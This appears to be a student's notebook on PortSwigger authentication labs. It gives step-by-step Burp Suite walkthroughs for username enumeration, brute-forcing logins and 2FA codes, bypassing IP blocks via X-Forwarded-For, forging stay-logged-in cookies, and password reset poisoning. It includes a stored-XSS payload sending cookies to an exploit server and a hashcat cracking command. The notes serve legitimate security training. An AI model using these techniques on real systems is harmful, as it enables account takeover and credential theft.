[Broken Authentication & Session Management](https://www.hackingarticles.in/comprehensive-guide-on-broken-authentication-session-management/)

# **1. Username enumeration via different responses**
This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

1. With Burp running, investigate the login page and submit an invalid username and password.
2. In Burp, go to **Proxy > HTTP history** and find the `POST /login` request. Highlight the value of the `username` parameter in the request and send it to Burp Intruder.
3. In Burp Intruder, notice that the `username` parameter is automatically set as a payload position. This position is indicated by two `§` symbols, for example: `username=§invalid-username§`. Leave the password as any static value for now.
4. Make sure that **Sniper attack** is selected.
5. In the **Payloads** side panel, make sure that the **Simple list** payload type is selected.
6. Under **Payload configuration**, paste the list of candidate usernames. Finally, click  **Start attack**. The attack will start in a new window.
7. When the attack is finished, examine the **Length** column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message `Invalid username`, but this response says `Incorrect password`. Make a note of the username in the **Payload** column.
8. Close the attack and go back to the **Intruder** tab. Click **Clear §**, then change the `username` parameter to the username you just identified. Add a payload position to the `password` parameter. The result should look something like this:
    `username=identified-user&password=§invalid-password§`
9. In the **Payloads** side panel, clear the list of usernames and replace it with the list of candidate passwords. Click  **Start attack**.
10. When the attack is finished, look at the **Status** column. Notice that each request received a response with a `200` status code except for one, which got a `302` response. This suggests that the login attempt was successful - make a note of the password in the **Payload** column.
11. Log in using the username and password that you identified and access the user account page to solve the lab.


Analysis:
- fuzzing username input field(filter by the length of response) 
	 ![[Pasted image 20241016174020.png]]

- fuzzing password input field
	![[Pasted image 20241016174234.png]]
	

# **2. Password reset broken logic**
This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

1. With Burp running, click the **Forgot your password?** link and enter your own username.
2. Click the **Email client** button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
3. In Burp, go to **Proxy > HTTP history** and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the `POST /forgot-password?temp-forgot-password-token` request contains the username as hidden input. Send this request to Burp Repeater.
4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
5. In the browser, request a new password reset and change your password again. Send the `POST /forgot-password?temp-forgot-password-token` request to Burp Repeater again.
6. In Burp Repeater, delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. Change the `username` parameter to `carlos`. Set the new password to whatever you want and send the request.
7. In the browser, log in to Carlos's account using the new password you just set. Click **My account** to solve the lab.

Analysis:
	![[Pasted image 20241016181627.png]]
-  modifying temp-forgot-password-token does not affect the functionality
	![[Pasted image 20241016181819.png]]
- change username to carlos in order to reset his password
	![[Pasted image 20241016182101.png]]
# **3.** **Username enumeration via subtly different responses**
This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

1. With Burp running, submit an invalid username and password. Highlight the `username` parameter in the `POST /login` request and send it to Burp Intruder.
2. Go to **Intruder**. Notice that the `username` parameter is automatically marked as a payload position.
3. In the **Payloads** side panel, make sure that the **Simple list** payload type is selected and add the list of candidate usernames.
4. Click on the  **Settings** tab to open the **Settings** side panel. Under **Grep - Extract**, click **Add**. In the dialog that appears, scroll down through the response until you find the error message `Invalid username or password.`. Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click **OK** and then start the attack.
5. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.
6. Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.
7. Close the results window and go back to the **Intruder** tab. Insert the username you just identified and add a payload position to the `password` parameter:
    `username=identified-user&password=§invalid-password§`
8. In the **Payloads** side panel, clear the list of usernames and replace it with the list of passwords. Start the attack.
9. When the attack is finished, notice that one of the requests received a `302` response. Make a note of this password.
10. Log in using the username and password that you identified and access the user account page to solve the lab.

Analysis:
- same as previous lab, however on the username fuzz we will grep responses by `Invalid username or password.`

# **4. Username enumeration via response timing**
This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- Your credentials: `wiener:peter`
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. With Burp running, submit an invalid username and password, then send the `POST /login` request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.
2. Identify that the `X-Forwarded-For` header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.
3. Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.
4. Send this request to Burp Intruder and select **Pitchfork attack** from the attack type drop-down menu. Add the `X-Forwarded-For` header.
5. Add payload positions for the `X-Forwarded-For` header and the `username` parameter. Set the password to a very long string of characters (about 100 characters should do it).
6. In the **Payloads** side panel, select position `1` from the **Payload position** drop-down list. Select the **Numbers** payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.
7. Select position `2` from the **Payload position** drop-down list, then add the list of usernames. Start the attack.
8. When the attack finishes, at the top of the dialog, click **Columns** and select the **Response received** and **Response completed** options. These two columns are now displayed in the results table.
9. Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.
10. Create a new Burp Intruder attack for the same request. Add the `X-Forwarded-For` header again and add a payload position to it. Insert the username that you just identified and add a payload position to the `password` parameter.
11. In the **Payloads** side panel, add the list of numbers to payload position 1 and add the list of passwords to payload position 2. Start the attack.
12. When the attack is finished, find the response with a `302` status. Make a note of this password.
13. Log in using the username and password that you identified and access the user account page to solve the lab.

Analysis:
- The longer the password, the more work the algorithm has to do in terms of processing each character and producing a hash. This results in **increased response time** for longer passwords. When an **invalid username** is entered, the system may bypass the password hashing and comparison altogether, quickly returning a generic "invalid credentials" message, resulting in a uniform response time.

![[Pasted image 20241017165815.png]]
- using `X-Forwarded-For` to bypass IP blocking by too many requests
![[Pasted image 20241017165935.png]]
![[Pasted image 20241017170132.png]]
![[Pasted image 20241017170554.png]]
- fuzzing the username --> password
![[Pasted image 20241017170653.png]]

# **5.  Broken brute-force protection, IP block**
This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.
2. Enter an invalid username and password, then send the `POST /login` request to Burp Intruder. Create a pitchfork attack with payload positions in both the `username` and `password` parameters.
3. Click  **Resource pool** to open the **Resource pool** side panel, then add the attack to a resource pool with **Maximum concurrent requests** set to `1`. By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order.
4. Click  **Payloads** to open the **Payloads** side panel, then select position `1` from the **Payload position** drop-down list. Add a list of payloads that alternates between your username and `carlos`. Make sure that your username is first and that `carlos` is repeated at least 100 times.
5. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.
6. Select position `2` from the **Payload position** drop-down list, then add the password list. Start the attack.
7. When the attack finishes, filter the results to hide responses with a `200` status code. Sort the remaining results by username. There should only be a single `302` response for requests with the username `carlos`. Make a note of the password from the **Payload 2** column.
8. Log in to Carlos's account using the password that you identified and access his account page to solve the lab.

Analysis:
![[Pasted image 20241017173139.png]]
![[Pasted image 20241017173228.png]]
- alternating list with valid credentials in order to reset the login attempt treshold
![[Pasted image 20241017173718.png]]
![[Pasted image 20241017173831.png]]
- filtering by 302 http response on carlos username
![[Pasted image 20241017181023.png]]
1. **IP Blocking Mechanism**: The server blocks an IP after 3 failed login attempts, which is supposed to protect against brute-force attacks.
2. **Logic Flaw**: You can **reset** the failure count by logging into your own account before hitting the limit. By doing this, you bypass the IP block.
3. **Burp Suite Attack**: You configure a **Pitchfork attack** in Burp Intruder to alternate login requests between your account (**wiener**) and the victim’s account (**carlos**).
    - You alternate the usernames (wiener and carlos).
    - For **wiener**, you send your correct password.
    - For **carlos**, you brute-force passwords from the candidate list.
4. **Bypass IP Blocking**: Since the requests are alternating between two users, the IP block is never triggered because successful logins to **wiener** reset the counter.
	
	- **200 OK**: This is the typical response when the login fails because the page is reloaded (i.e., failed login attempt).
	- **302 Found** (Redirect): When a login is **successful**, the server often responds with a **302 status code** to redirect the user to a different page (like the account dashboard).

# **6. Username enumeration via account lock**
This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. With Burp running, investigate the login page and submit an invalid username and password. Send the `POST /login` request to Burp Intruder.
2. Select **Cluster bomb attack** from the attack type drop-down menu. Add a payload position to the `username` parameter. Add a blank payload position to the end of the request body by clicking **Add §** twice. The result should look something like this:
    `username=§invalid-username§&password=example§§`
3. In the **Payloads** side panel, add the list of usernames for the first payload position. For the second payload position, select the **Null payloads** type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
4. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: `You have made too many incorrect login attempts.` Make a note of this username.
5. Create a new Burp Intruder attack on the `POST /login` request, but this time select **Sniper attack** from the attack type drop-down menu. Set the `username` parameter to the username that you just identified and add a payload position to the `password` parameter.
6. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
7. In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.
8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.

Analysis:

- invalid username/password --> 'Invalid username or password'
- valid username/password --> You have made too many incorrect login attempts
    
  The result of this configuration in Burp Intruder is that for each username (from the first payload position), the same username will be tested five times due to the **Null payloads** in the second position. The second position doesn’t actually alter the password or other data but adds repetition of login attempts for each username.  
	![[Pasted image 20241018234604.png]]
	![[Pasted image 20241018234940.png]]

- filtering&looking for the longest response length (correct username)
- fuzz password using sniper(grep by 'Invalid username or password' error)

# **7. 2FA broken logic**
This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page. You also have access to the email server to receive your 2FA verification cod
- Your credentials: `wiener:peter`
- Victim's username: `carlos`

1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the `POST /login2` request, the `verify` parameter is used to determine which user's account is being accessed.
2. Log out of your account.
3. Send the `GET /login2` request to Burp Repeater. Change the value of the `verify` parameter to `carlos` and send the request. This ensures that a temporary 2FA code is generated for Carlos.
4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
5. Send the `POST /login2` request to Burp Intruder.
6. In Burp Intruder, set the `verify` parameter to `carlos` and add a payload position to the `mfa-code` parameter. Brute-force the verification code.
7. Load the 302 response in the browser.
8. Click **My account** to solve the lab.

Analysis:
![[Pasted image 20241019002453.png]]
![[Pasted image 20241019002839.png]]

- in order to trick the server to generate a temporary 2FA for user `carlos` we will modify the `verify` parameter of the GET/login2 request(while we are still logged as wiener)-->carlos.
![[Pasted image 20241019003549.png]]
- now we will generate fail attempt on 2FA (POST/login2) and send it to intruder to brute force the temporary generated 2FA code for user carlos
![[Pasted image 20241019004838.png]]

# **8.  Brute-forcing a stay-logged-in cookie**
This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. With Burp running, log in to your own account with the **Stay logged in** option selected. Notice that this sets a `stay-logged-in` cookie.
2. Examine this cookie in the [Inspector](https://portswigger.net/burp/documentation/desktop/tools/inspector) panel and notice that it is Base64-encoded. Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:
    `base64(username+':'+md5HashOfPassword)`
3. Log out of your account.
4. In the most recent `GET /my-account`, highlight the `stay-logged-in` cookie parameter and send the request to Burp Intruder.
5. In Burp Intruder, notice that the `stay-logged-in` cookie has been automatically added as a payload position. Add your own password as a single payload.
6. Under **Payload processing**, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
    - Hash: `MD5`
    - Add prefix: `wiener:`
    - Encode: `Base64-encode`
7. As the **Update email** button is only displayed when you access the `/my-account` page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  **Settings** side panel, add a grep match rule to flag any responses containing the string `Update email`. Start the attack.
8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
9. Make the following adjustments and then repeat this attack:
    - Remove your own password from the payload list and add the list of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) instead.
    - Change the **Add prefix** rule to add `carlos:` instead of `wiener:`.
10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing `Update email`. The payload from this request is the valid `stay-logged-in` cookie for Carlos's account.

Analysis:

stay-logged-in: base64(username:md5(password))
![[Pasted image 20241019021103.png]]
**note:**
	is recommended to use an offline hash cracking tool as hashcat (not considered data breaching data)
		`hashcat -a 0 -m 0 file.txt rockyou.txt`

- **`-a 0`**: This specifies the **attack mode**. The value `0` refers to a **dictionary attack**. In a dictionary attack, Hashcat will use each word from a wordlist (in this case, `rockyou.txt`) and attempt to crack the hashes by matching each word against the hash in the `file.txt`.
- **`-m 0`**: This specifies the **hash type**. The value `0` refers to **MD5** hashes. You are telling Hashcat that the hashes in `file.txt` are using the MD5 algorithm, so it will attempt to crack them as MD5 hashes.
- **`file.txt`**: This is the file containing the **hashes** you want to crack. Each hash is assumed to be stored on a separate line in this file.
- **`rockyou.txt`**: This is the **wordlist** file, typically containing a list of common passwords. In this case, the famous **RockYou** password list is being used, which is a large collection of leaked passwords often used in cracking attempts.


- we apply the predefined rules discovered on our first request
	brute-forcing= base64(carlos:md5(X))
	![[Pasted image 20241019022121.png]]

# **9. Offline password cracking**
This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
    `username+':'+md5HashOfPassword`

3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to the exploit server and make a note of the URL.
5. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID:
    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
    
6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
7. Decode the cookie in Burp Decoder. The result will be:
    `carlos:26323c16d5f4dabff3bb136f2460a943`
8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.

# **10. Password reset poisoning via middleware**
This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
2. Send the `POST /forgot-password` request to Burp Repeater. Notice that the `X-Forwarded-Host` header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
3. Go to the exploit server and make a note of your exploit server URL.
4. Go back to the request in Burp Repeater and add the `X-Forwarded-Host` header with your exploit server URL:
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
5. Change the `username` parameter to `carlos` and send the request.
6. Go to the exploit server and open the access log. You should see a `GET /forgot-password` request, which contains the victim's token as a query parameter. Make a note of this token.
7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the `temp-forgot-password-token` parameter to the value that you stole from the victim.
8. Load this URL and set a new password for Carlos's account.

Analysis:
- capture forgot-password request in burp
![[Pasted image 20241021141937.png]]

- adding `X-Forwarded-Host: external exploit server` to capture the new forgot password request with a new username: `carlos`
![[Pasted image 20241021142119.png]]
	![[Pasted image 20241021142233.png]]

- we will use our valid change password URL and swap token with the new one that we have generated for user `carlos`
![[Pasted image 20241021142519.png]]

# **11.  Password brute-force via password change**
This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
2. Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states `Current password is incorrect`. If you enter a valid current password, but two different new passwords, the message says `New passwords do not match`. We can use this message to enumerate correct passwords.
3. Enter your correct current password and two new passwords that do not match. Send this `POST /my-account/change-password` request to Burp Intruder.
4. In Burp Intruder, change the `username` parameter to `carlos` and add a payload position to the `current-password` parameter. Make sure that the new password parameters are set to two different values. For example:
    `username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc`
5. In the **Payloads** side panel, enter the list of passwords as the payload set.
6. Click  **Settings** to open the **Settings** side panel, then add a grep match rule to flag responses containing `New passwords do not match`. Start the attack.
7. When the attack finished, notice that one response was found that contains the `New passwords do not match` message. Make a note of this password.
8. In the browser, log out of your own account and lock back in with the username `carlos` and the password that you just identified.

Analysis:
- wrong password, newpassword1 **=** newpassword2 (lock account - log out);
- wrong password, newpassword1 **!=** newpassword2 (message: current password do not match);

- correct password, newpassword1 **=** newpassword2 (changing current password);
- correct password, newpassword1 **!=** newpassword2 (message: new passwords do not match);

![[Pasted image 20241021155151.png]]

![[Pasted image 20241021155339.png]]
	![[Pasted image 20241021155608.png]]
![[Pasted image 20241021155818.png]]

# **12. Broken brute-force protection, multiple credentials per request**
This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

1. With Burp running, investigate the login page. Notice that the `POST /login` request submits the login credentials in `JSON` format. Send this request to Burp Repeater.
2. In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:
    
    `"username" : "carlos", "password" : [ "123456", "password", "qwerty" ... ]`
3. Send the request. This will return a 302 response.
4. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser. The page loads and you are logged in as `carlos`.
5. Click **My account** to access Carlos's account page and solve the lab.

Analysis:
![[Pasted image 20241021160340.png]]
![[Pasted image 20241021160445.png]]
	![[Pasted image 20241021160537.png]]

# **13. 2FA bypass using a brute-force attack**
This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

Victim's credentials: `carlos:montoya`
#### Note:
As the verification code will reset while you're running your attack, you may need to repeat this attack several times before you succeed. This is because the new code may be a number that your current Intruder attack has already attempted.

1. With Burp running, log in as `carlos` and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp's session handling features to log back in automatically before sending each request.
2. In Burp, click  **Settings** to open the **Settings** dialog, then click **Sessions**. In the **Session Handling Rules** panel, click **Add**. The **Session handling rule editor** dialog opens.
3. In the dialog, go to the **Scope** tab. Under **URL Scope**, select the option **Include all URLs**.
4. Go back to the **Details** tab and under **Rule Actions**, click **Add > Run a macro**.
5. Under **Select macro** click **Add** to open the **Macro Recorder**. Select the following 3 requests:
    `GET /login POST /login GET /login2`
6. Click **Test macro** and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.
8. Send the `POST /login2` request to Burp Intruder.
9. In Burp Intruder, add a payload position to the `mfa-code` parameter. In the **Payloads** side panel, select the **Numbers** payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer.
11. Click on  **Resource pool** to open the **Resource pool** side panel. Add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
12. Start the attack. Eventually, one of the requests will return a `302` status code. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser.

Analysis:
- in a real word scenario, this technique will not work thus the 2FA will not be a static code (the refresh rate is under 30 sec --> not enough time to brute force the 4 digits code)
------------------------------------------------------------------------
- If you enter the wrong 2FA code **twice**, the application logs you out. This is a security mechanism we need to work around.
- To overcome this, we’ll use **Burp's session handling rules** to automatically log back in after each failed 2FA attempt.
- In the **Resource Pool** tab, create a new resource pool and set **Maximum concurrent requests** to `1`.
- This ensures that the requests are sent one at a time, allowing Burp's session handling macro to re-login after every two failed attempts.

- #####  **Adding a Session Handling Rule:**
	 **Create a new rule**: In the Session Handling Rules panel, click **Add**. In the **Scope** tab, select **Include all URLs** to ensure the rule applies to all requests related to the target.

- ##### **Creating a Macro to Re-Log in Automatically:**
	Go to the **Details** tab in the Session Handling Rule Editor. Under **Rule Actions**, click **Add** > **Run a macro** and **Record the login sequence**:
    - **GET /login**: Request to load the login page.
    - **POST /login**: Request to submit Carlos's username and password.
    - **GET /login2**: Request that loads the 2FA page after successful login.